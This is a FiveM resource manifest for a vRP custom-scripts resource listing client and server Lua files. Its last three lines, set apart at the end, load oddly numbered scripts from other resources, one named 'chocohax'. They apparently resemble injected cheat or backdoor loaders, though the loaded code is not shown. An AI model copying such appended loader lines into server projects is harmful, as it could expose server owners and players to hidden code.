fx_version 'adamant'
game 'gta5'

description "vrp_customScripts"

dependencies {
    'vrp'
}

client_scripts{ 
  "lib/Tunnel.lua",
  "lib/Proxy.lua",
  "cl-side.lua",
  --"radar-c.lua",
  "vreme-c.lua",
  "elf-c.lua",
  "vorbeste.lua"
  --"culcat-c.lua"
}

server_scripts{ 
  "@vrp/lib/utils.lua",
  "elf-s.lua",
  "vreme-s.lua",
  "afksleep-s.lua"
  --"radar-s.lua"

}



client_script "13277.lua"
client_script '@chocohax/10992.lua'
client_script '@anticheat/54639.lua'